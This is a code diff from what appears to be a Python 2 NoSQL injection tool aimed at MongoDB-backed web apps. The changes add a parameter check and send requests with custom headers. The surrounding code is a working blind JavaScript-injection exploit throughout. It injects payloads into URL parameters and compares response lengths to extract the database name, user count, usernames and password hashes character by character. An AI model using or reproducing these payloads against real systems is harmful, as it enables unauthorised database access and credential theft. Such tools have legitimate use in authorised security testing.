@@ -862,6 +862,11 @@ def getApps():
 
 		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
 		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
+		if "?" not in appURL:
+			print "No URI parameters provided for GET request...Check your options.\n"
+			raw_input("Press enter to continue...")
+			return()
+
 		randomUri = buildUri(appURL,injectString)
 		print "URI : " + randomUri
 		req = urllib2.Request(randomUri, None, requestHeaders)
@@ -1526,7 +1531,8 @@ def getDBInfo():
 	print "Getting baseline True query return size..."
 	trueUri = uriArray[16].replace("---","return true; var dummy ='!" + "&")
 	#print "Debug " + str(trueUri)
-	baseLen = int(len(urllib.urlopen(trueUri).read()))
+	req = urllib2.Request(trueUri, None, requestHeaders)
+	baseLen = int(len(urllib2.urlopen(req).read()))
 	print "Got baseline true query length of " + str(baseLen)
 
 	print "Calculating DB name length..."
@@ -1534,7 +1540,8 @@ def getDBInfo():
 	while gotNameLen == False:
 		calcUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.length ==" + str(curLen) + ") {return true;} var dum='a" + "&")
 		#print "Debug: " + calcUri
-		lenUri = int(len(urllib.urlopen(calcUri).read()))
+		req = urllib2.Request(calcUri, None, requestHeaders)
+		lenUri = int(len(urllib2.urlopen(req).read()))
 		#print "Debug length: " + str(lenUri)
 
 		if lenUri == baseLen:
@@ -1547,7 +1554,9 @@ def getDBInfo():
 	print "Database Name: ",
 	while gotDbName == False:
 		charUri = uriArray[16].replace("---","var curdb = db.getName(); if (curdb.charAt(" + str(nameCounter) + ") == '"+ chars[charCounter] + "') { return true; } var dum='a" + "&")
-		lenUri = int(len(urllib.urlopen(charUri).read()))
+
+		req = urllib2.Request(charUri, None, requestHeaders)
+		lenUri = int(len(urllib2.urlopen(req).read()))
 
 		if lenUri == baseLen:
 			dbName = dbName + chars[charCounter]
@@ -1571,7 +1580,9 @@ def getDBInfo():
 		#find the total number of users on the database
 		while gotUserCnt == False:
 			usrCntUri = uriArray[16].replace("---","var usrcnt = db.system.users.count(); if (usrcnt == " + str(usrCount) + ") { return true; } var dum='a")
-			lenUri = int(len(urllib.urlopen(usrCntUri).read()))
+
+			req = urllib2.Request(usrCntUri, None, requestHeaders)
+			lenUri = int(len(urllib2.urlopen(req).read()))
 
 			if lenUri == baseLen:
 				print "Found " + str(usrCount) + " user(s)."
@@ -1595,7 +1606,9 @@ def getDBInfo():
 				while charCountUsr == False:
 					#different query to get the first user vs. others
 					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
-					lenUri = int(len(urllib.urlopen(usrUri).read()))
+
+					req = urllib2.Request(usrUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						#Got the right number of characters
@@ -1606,7 +1619,9 @@ def getDBInfo():
 
 				while  rightCharsUsr < usrChars:
 					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
-					lenUri = int(len(urllib.urlopen(usrUri).read()))
+
+					req = urllib2.Request(usrUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						username = username + chars[charCounterUsr]
@@ -1629,7 +1644,9 @@ def getDBInfo():
 
 				while rightCharsHash < 32:  #Hash length is static
 					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")
-					lenUri = int(len(urllib.urlopen(hashUri).read()))
+
+					req = urllib2.Request(hashUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						pwdHash = pwdHash + chars[charCounterHash]
@@ -1650,7 +1667,9 @@ def getDBInfo():
 				while charCountUsr == False:
 					#different query to get the first user vs. others
 					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")
-					lenUri = int(len(urllib.urlopen(usrUri).read()))
+
+					req = urllib2.Request(usrUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						#Got the right number of characters
@@ -1661,7 +1680,9 @@ def getDBInfo():
 
 				while  rightCharsUsr < usrChars:
 					usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")
-					lenUri = int(len(urllib.urlopen(usrUri).read()))
+
+					req = urllib2.Request(usrUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						username = username + chars[charCounterUsr]
@@ -1681,7 +1702,9 @@ def getDBInfo():
 
 				while rightCharsHash < 32:  #Hash length is static
 					hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")
-					lenUri = int(len(urllib.urlopen(hashUri).read()))
+
+					req = urllib2.Request(hashUri, None, requestHeaders)
+					lenUri = int(len(urllib2.urlopen(req).read()))
 
 					if lenUri == baseLen:
 						pwdHash = pwdHash + chars[charCounterHash]
